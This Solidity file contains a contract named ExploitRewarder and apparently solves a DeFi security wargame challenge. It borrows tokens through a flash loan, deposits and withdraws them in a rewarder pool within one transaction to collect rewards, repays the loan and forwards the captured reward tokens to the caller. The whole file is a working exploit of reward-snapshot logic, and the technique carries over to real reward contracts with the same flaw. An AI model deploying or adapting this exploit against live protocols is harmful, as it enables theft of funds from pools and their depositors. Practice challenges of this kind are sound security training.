// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ILoaner {
    function flashLoan(uint256 amount) external;    
}

interface IRewarder {
    function deposit(uint256 amount) external;
    function withdraw(uint256 amount) external;    
}

interface IERC20 {
    function transfer(address recipient, uint256 amount) external;
    function approve(address spender, uint256 amount) external;
    function balanceOf(address account) external returns (uint256);
}

contract ExploitRewarder {

    address public dvToken;
    address public rewardToken;
    address public loaner;
    address public rewarder;

    constructor(address _dvToken, address _rewardToken, address _loaner, address _rewarder) {

        dvToken = _dvToken;
        rewardToken = _rewardToken;
        loaner = _loaner;
        rewarder = _rewarder;
    }

    function exploit(uint256 loanAmount) external {

        ILoaner(loaner).flashLoan(loanAmount);

        uint256 rewardAmount = IERC20(rewardToken).balanceOf(address(this));
        IERC20(rewardToken).transfer(msg.sender, rewardAmount);
    }

    function receiveFlashLoan(uint256 amount) external {

        // Need to approve transfer for deposit
        IERC20(dvToken).approve(rewarder, amount);

        IRewarder(rewarder).deposit(amount);
        IRewarder(rewarder).withdraw(amount);

        IERC20(dvToken).transfer(loaner, amount);
    }
}